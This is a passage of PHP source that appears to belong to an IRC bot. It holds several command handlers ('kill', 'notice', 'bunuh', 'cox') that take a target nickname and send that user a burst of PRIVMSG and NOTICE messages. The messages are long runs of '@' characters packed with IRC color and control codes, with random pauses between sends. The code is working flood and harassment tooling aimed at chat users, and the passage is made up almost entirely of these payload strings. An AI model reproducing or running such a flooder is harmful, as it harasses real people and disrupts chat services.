%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.%038%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.' . CRL);	
						}
						elseif ($com[3]==':`kill' && $com[4] && $com[5]) {
							$msg = strstr($data,":`kill");
							$msg = str_replace(":`kill $com[4] ","",$msg);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'8,7@@@@@@@@@@@@@%@@%@@%@@@@@@@@%@@%@@%@@%@@%@*@%@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' . CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'0,11@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' . CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'0,11@@@@@9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA@@@@@@@@@9,3hiyA 5,4hIyA 6,11hIyA 7,6hiyA 8,7hIyA 9,3hiyA 4,8hIyA 9,3hiyA@@@@' . CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'7,1@@@@@@@@@@@@@@@@@@@0,11@@@@@HaHa!HaHaH9,3a!HaHaHa!HaHa!HaHaHa!Ha9,3HaHa!HaHa!HaHaHa!HaHaHa!H0,11aHa!HaHaHa!HaHa!@@@@@@@@@@@@@@9,3@@@@@@@@@@@@@@@@@@@@' . CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%1F%7F%7F%7F%1F' . CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%037,1@@%1F%7F%7F%7F%1F' . CRL);
								sleep(rand(1,6));
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%032,14@@@@@@@@@@@@@@@@@@@@@@@%031*%02kO%032pEt%02%1F%033* %7F!%1F%02K%034oPe%035T%02%1F! %7F#%1F%02%036kOpE%037t%02%1F# %7F[%031%1F%02KoP%039eT%02%1F]%0310  %7F!%1F%02KoP%033eT%02%1F! %7F%034#%1F%02kOp%035Et%02@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%1F%7F%7F%7F%1F' . CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%038,11@@@@@@@@@@@@?Ã?HÂ?%02%1FMÃ?Ã?Ã?HÂ?%02%1FMÃ?Ã?Ã?HÂ?%1F%02%0312MÃ?Ã?Ã?HÂ?%02%1FMÃ?Ã?Ã?HÂ?%02%1FMÃ?Ã?Ã?HÂ?%1F%02%0312MÃ?Ã?Ã?HÂ?%02%1FMÃ?Ã?Ã?HÂ?%02%1FMÃ?Ã?@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%1F%7F%7F%7F%1F' . CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%038,8@@@@@@@@@@k%0312A%1FlI W%1Fe%0310kZW%1Fek%0314Z %1FWe%038kZ%1FWek %037%1FWekZ%1FW%036ek%1FZ %02%0312,7%1FBeBe%1FK %038aDu%1FS %0313kA%1FlI %036We%1FkZ%035Wek%1FZ%034 Wek%033Z%1FWek%032 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%1F%7F%7F%7F%1F' . CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,8@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%1F%7F%7F%7F%1F' . CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%1F%7F%7F%7F%1F' . CRL);
								sleep(rand(1,6));
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%037,1@@%1F%7F%7F%7F%1F' . CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%032,14@@@@@@@@@@@@@@@@@@@@@@@%031*%02kO%032pEt%02%1F%033* %7F!%1F%02K%034oPe%035T%02%1F! %7F#%1F%02%036kOpE%037t%02%1F# %7F[%031%1F%02KoP%039eT%02%1F]%0310  %7F!%1F%02KoP%033eT%02%1F! %7F%034#%1F%02kOp%035Et%02@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%1F%7F%7F%7F%1F' . CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%038,11@@@@@@@@@@@@?Ã?HÂ?%02%1FMÃ?Ã?Ã?HÂ?%02%1FMÃ?Ã?Ã?HÂ?%1F%02%0312MÃ?Ã?Ã?HÂ?%02%1FMÃ?Ã?Ã?HÂ?%02%1FMÃ?Ã?Ã?HÂ?%1F%02%0312MÃ?Ã?Ã?HÂ?%02%1FMÃ?Ã?Ã?HÂ?%02%1FMÃ?Ã?@@@@@@@@@@@@@@@@@@@@@%1F%7F%7F%7F%1F' . CRL);
							fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.'%02%038,8@@@@@@@@@@k%0312A%1FlI W%1Fe%0310kZW%1Fek%0314Z %1FWe%038kZ%1FWek %037%1FWekZ%1FW%036ek%1FZ %02%0312,7%1FBeBe%1FK %038aDu%1FS %0313kA%1FlI %036We%1FkZ%035Wek%1FZ%034 Wek%033Z%1FWek%032 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%1F%7F%7F%7F%1F' . CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,8@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%1F%7F%7F%7F%1F' . CRL);
						}				
						elseif ($com[3]==':`notice' && $com[4] && $com[5]) {
							$msg = strstr($data,":`notice");
							$msg = str_replace(":`notice $com[4] ","",$msg);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
						}
						elseif ($com[3]==':`bunuh' && $com[4] && $com[5]) {
							$msg = strstr($data,":`bunuh");
							$msg = str_replace(":`bunuh $com[4] ","",$msg);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%038@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,8@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%034(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%038@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,8@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%034(G)'. CRL);
						}
						elseif ($com[3]==':`cox' && $com[4] && $com[5]) {
							$msg = strstr($data,":`cox");
							$msg = str_replace(":`cox $com[4] ","",$msg);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%030,0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
							fputs($fp,'NOTICE '.$com[4].' :'.$msg.'%02%031,1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(G)'. CRL);
								sleep(rand(1,6));
